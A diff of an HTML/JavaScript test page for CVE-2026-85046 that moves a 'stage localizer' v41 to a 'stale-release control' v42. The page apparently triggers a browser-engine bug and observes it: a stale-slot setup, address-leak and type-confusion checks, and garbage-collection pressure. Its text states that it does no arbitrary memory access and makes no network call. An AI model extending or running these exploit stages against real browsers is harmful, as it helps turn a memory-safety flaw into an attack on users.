@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>CVE-2026-85046 bounded stage localizer v41</title>
+  <title>CVE-2026-85046 bounded stale-release control v42</title>
   <style>
     :root { color-scheme: dark; font-family: ui-monospace, SFMono-Regular, Consolas, monospace; }
     body { margin: 0; padding: 24px; background: #09110e; color: #d9ffe7; }
@@ -17,15 +17,19 @@
 </head>
 <body>
 <main>
-  <h1>CVE-2026-85046 — bounded stage localizer v41</h1>
+  <h1>CVE-2026-85046 — bounded stale-release control v42</h1>
   <p>
-    This button-only diagnostic preserves the established 32 × 512 KiB pre-age
-    and bounded GC-oracle geometry, while writing only coarse durable stage
-    checkpoints. It creates no canary arrays, never dereferences the stale slot
-    as an object, and performs no fake-header, arbitrary-memory, native-code,
-    sandbox-escape, file, or network operation.
+    This A/B control preserves the exact v41 warm-up, pre-age, stale-arm and
+    GC-oracle schedule. At the completed-idle boundary it durably records the
+    numeric stale evidence, releases every retained carrier/WeakRef, and waits
+    ten seconds without allocating pressure. At that boundary it confirms by
+    schedule construction that the final v41 callback is already executing and
+    no pre-idle timer remains pending. It
+    creates no canary arrays, never dereferences the stale slot as an object,
+    and performs no fake-header, arbitrary-memory, native-code, sandbox-escape,
+    file, or network operation.
   </p>
-  <button id="run">Run stage localizer once</button>
+  <button id="run">Run stale-release control once</button>
   <pre id="output"></pre>
 </main>
 <script>
@@ -40,7 +44,7 @@ var CONFIG = Object.freeze({
   approximateKiBPerChunk: 512,
 });
 
-var CHECKPOINT_KEY = "f022-v41-stage-localizer-checkpoint";
+var CHECKPOINT_KEY = "f022-v42-release-control-checkpoint";
 var state = {
   running: false,
   runId: 0,
@@ -141,7 +145,7 @@ function readNumericStaleSlot() {
 function checkpoint(stages, extra) {
   if (!Array.isArray(stages)) stages = [stages];
   var record = Object.assign({
-    v: 41,
+    v: 42,
     stages: stages,
     stage: stages[stages.length - 1],
     run: state.runId,
@@ -155,16 +159,16 @@ function checkpoint(stages, extra) {
     if (verified !== serialized) throw new Error("checkpoint read-back mismatch");
   } catch (error) {
     window.probeResult = {
-      outcome: "v41-checkpoint-persistence-failed",
+      outcome: "v42-checkpoint-persistence-failed",
       failedStages: stages,
       error: String(error),
       rerunAllowed: false,
     };
     state.running = false;
     document.getElementById("output").textContent = JSON.stringify(window.probeResult, null, 2);
-    throw new Error("v41 fail-closed checkpoint failure: " + stages.join("+") + ": " + error);
+    throw new Error("v42 fail-closed checkpoint failure: " + stages.join("+") + ": " + error);
   }
-  window.v41Checkpoint = record;
+  window.v42Checkpoint = record;
   return record;
 }
 
@@ -197,7 +201,7 @@ function fail(outcome, detail) {
     outcome: outcome,
     detail: detail || null,
     runId: state.runId,
-    finalCheckpoint: window.v41Checkpoint || null,
+    finalCheckpoint: window.v42Checkpoint || null,
     beforeAddress: state.beforeAddress ? hex32(state.beforeAddress) : null,
     staleSlotAfter: stale.numeric ? hex32(stale.address) : null,
     staleSlotNumeric: stale.numeric,
@@ -224,7 +228,7 @@ function preAgeTask(index) {
   checkpoint(["preage-complete", "stale-arm-start"], { preAge: CONFIG.preAgeChunks });
   var setup = installStaleTarget();
   if (!setup.ok) {
-    fail("v41-target-address-leak-not-observed", setup.observed);
+    fail("v42-target-address-leak-not-observed", setup.observed);
     return;
   }
   var stale = readNumericStaleSlot();
@@ -302,8 +306,8 @@ function oracleObservationTask() {
 
   if (state.chunkIndex >= CONFIG.maxOracleChunks) {
     fail(state.moveChunk === null
-      ? "v41-target-did-not-move-within-bound"
-      : "v41-controls-did-not-finalize-within-bound");
+      ? "v42-target-did-not-move-within-bound"
+      : "v42-controls-did-not-finalize-within-bound");
     return;
   }
   setTimeout(oraclePressureTask, 0);
@@ -329,7 +333,7 @@ function createSecondControlTask() {
 
 function finishIdle() {
   var stale = readNumericStaleSlot();
-  var finalCheckpoint = checkpoint("idle-complete", {
+  var releaseCheckpoint = checkpoint(["idle-complete", "release-start"], {
     before: hex32(state.beforeAddress),
     moveChunk: state.moveChunk,
     moved: hex32(state.moveAddress),
@@ -340,26 +344,64 @@ function finishIdle() {
     aFinal: state.controlAFinalizedChunk,
     bCreated: state.controlBCreatedChunk,
     bFinal: state.controlBFinalizedChunk,
+    staleNumeric: stale.numeric,
   });
-  var result = {
-    outcome: "v41-stage-localizer-idle-complete",
-    config: CONFIG,
-    finalCheckpoint: finalCheckpoint,
-    staleSamples: state.staleSamples,
-    finalizationEvents: state.finalizationEvents,
-    pressureSink: state.pressureSink,
-    canaryArraysCreated: false,
-    staleSlotDereferenceAttempted: false,
-    fakeHeaderAttempted: false,
-    arbitraryMemoryAccessAttempted: false,
-    nativeCodeExecutionAttempted: false,
-    sandboxEscapeAttempted: false,
-    externalNetworkUsed: false,
+
+  state.bad = null;
+  state.targetWeak = null;
+  state.controlAWeak = null;
+  state.controlBWeak = null;
+  var releaseAssertions = {
+    badCarrierNull: state.bad === null,
+    targetWeakNull: state.targetWeak === null,
+    controlAWeakNull: state.controlAWeak === null,
+    controlBWeakNull: state.controlBWeak === null,
   };
-  window.probeResult = result;
-  state.running = false;
-  log("[*] Page is idle. No allocation timer remains.");
-  log("\n" + JSON.stringify(result, null, 2));
+  if (!releaseAssertions.badCarrierNull || !releaseAssertions.targetWeakNull ||
+      !releaseAssertions.controlAWeakNull || !releaseAssertions.controlBWeakNull) {
+    fail("v42-release-null-assertion-failed", releaseAssertions);
+    return;
+  }
+
+  log("[+] Durable release-start checkpoint stored and verified.");
+  log("[*] Stale carrier/target references released; waiting 10 seconds.");
+
+  setTimeout(function () {
+    var finalCheckpoint = checkpoint("release-survived-10s", {
+      before: hex32(state.beforeAddress),
+      moveChunk: state.moveChunk,
+      moved: hex32(state.moveAddress),
+      finalChunk: state.chunkIndex,
+      staleAtRelease: releaseCheckpoint.stale,
+      staleOriginalAtRelease: releaseCheckpoint.staleOriginal,
+      releaseAssertions: releaseAssertions,
+      pendingV41TimersAtRelease: 0,
+      survivalMilliseconds: 10000,
+    });
+    var result = {
+      outcome: "v42-release-survived-10s",
+      config: CONFIG,
+      finalCheckpoint: finalCheckpoint,
+      releaseCheckpoint: releaseCheckpoint,
+      releaseAssertions: releaseAssertions,
+      pendingV41TimersAtRelease: 0,
+      survivalMilliseconds: 10000,
+      staleSamples: state.staleSamples,
+      finalizationEvents: state.finalizationEvents,
+      pressureSink: state.pressureSink,
+      canaryArraysCreated: false,
+      staleSlotDereferenceAttempted: false,
+      fakeHeaderAttempted: false,
+      arbitraryMemoryAccessAttempted: false,
+      nativeCodeExecutionAttempted: false,
+      sandboxEscapeAttempted: false,
+      externalNetworkUsed: false,
+    };
+    window.probeResult = result;
+    state.running = false;
+    log("[+] Release control survived 10 seconds.");
+    log("\n" + JSON.stringify(result, null, 2));
+  }, 10000);
 }
 
 function runOnce() {
@@ -371,12 +413,12 @@ function runOnce() {
   state.running = true;
   state.runId = Date.now();
   document.getElementById("run").disabled = true;
-  document.getElementById("run").textContent = "Stage localizer running";
+  document.getElementById("run").textContent = "Stale-release control running";
   document.getElementById("output").textContent = "";
   checkpoint("started");
 
   if (typeof WeakRef !== "function" || !registry) {
-    fail("v41-weak-reference-apis-unavailable");
+    fail("v42-weak-reference-apis-unavailable");
     return;
   }
 
@@ -392,7 +434,7 @@ function runOnce() {
     parts = String(demo).split(",");
   }
   if (!looksLikeLeak(parts)) {
-    fail("v41-type-confusion-not-observed");
+    fail("v42-type-confusion-not-observed");
     return;
   }
 
@@ -409,15 +451,15 @@ function showPriorCheckpoint() {
   try { prior = localStorage.getItem(CHECKPOINT_KEY); } catch (_) {}
   if (prior) {
     button.disabled = true;
-    button.textContent = "Previous v41 attempt recorded — fresh renderer required";
+    button.textContent = "Previous v42 attempt recorded — fresh renderer required";
     var parsed = prior;
     try { parsed = JSON.parse(prior); } catch (_) {}
-    window.v41PreviousCheckpoint = parsed;
+    window.v42PreviousCheckpoint = parsed;
     window.probeResult = {
-      outcome: "v41-prior-checkpoint-present",
+      outcome: "v42-prior-checkpoint-present",
       previousCheckpoint: parsed,
       rerunAllowed: false,
-      instruction: "Open a genuinely fresh renderer to run v41 again.",
+      instruction: "Open a genuinely fresh renderer to run v42 again.",
       canaryArraysCreated: false,
       staleSlotDereferenceAttempted: false,
       nativeCodeExecutionAttempted: false,
@@ -426,7 +468,7 @@ function showPriorCheckpoint() {
     out.textContent = "Previous durable checkpoint:\n" + JSON.stringify(parsed, null, 2) +
       "\n\nRerun is disabled in this renderer/origin state.";
   } else {
-    out.textContent = "No previous v41 checkpoint. Click once to begin.";
+    out.textContent = "No previous v42 checkpoint. Click once to begin.";
   }
 }
 
